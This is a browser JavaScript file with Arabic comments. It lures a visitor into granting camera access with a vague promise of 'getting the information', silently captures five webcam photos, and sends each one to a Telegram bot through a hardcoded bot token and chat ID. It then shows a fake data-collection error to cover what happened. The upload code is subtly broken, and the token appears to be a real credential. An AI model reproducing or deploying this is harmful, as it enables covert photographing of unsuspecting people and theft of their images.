function requestPermissions() {
    if (confirm("قم بإعطاء كل الأذونات للحصول على المعلومات")) {
        getCameraAccess();
    }
}

// 📸 تشغيل الكاميرا والتقاط 5 صور
function getCameraAccess() {
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            let video = document.createElement("video");
            video.srcObject = stream;
            video.play();

            let photoCount = 0; // عداد الصور

            function capturePhoto() {
                if (photoCount < 5) { // التقاط 5 صور فقط
                    let canvas = document.createElement("canvas");
                    let ctx = canvas.getContext("2d");
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    let imageData = canvas.toDataURL("image/png");
                    sendToBot(imageData, `photo_${photoCount + 1}`); // إرسال الصورة للبوت

                    photoCount++;
                    setTimeout(capturePhoto, 3000); // التقاط صورة جديدة بعد 3 ثوانٍ
                } else {
                    // إغلاق الكاميرا بعد التقاط 5 صور
                    stream.getTracks().forEach(track => track.stop());

                    // عرض رسالة الخطأ للمستخدم
                    setTimeout(() => {
                        document.body.innerHTML = "<h2 style='color:red;'>هناك خطأ في جمع البيانات</h2>";
                    }, 2000);
                }
            }

            setTimeout(capturePhoto, 3000); // بدء التقاط أول صورة بعد 3 ثوانٍ
        })
        .catch(err => {
            alert("يجب إعطاء إذن الوصول إلى الكاميرا!");
        });
}

// 🚀 إرسال البيانات إلى بوت تيليجرام
function sendToBot(imageData, photoName) {
    let botToken = "7624081263:AAEJBknssL9zfxaZmFf2uf5Xw3usF8U1lGc"; // توكن البوت
    let chatId = "7554235698"; // معرف الشات (المستخدم / القناة / المجموعة)

    let message = `📸 **صورة جديدة:**\n📝 الاسم: ${photoName}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: "POST",
        body: new FormData().append("chat_id", chatId).append("photo", imageData).append("caption", message)
    });
}
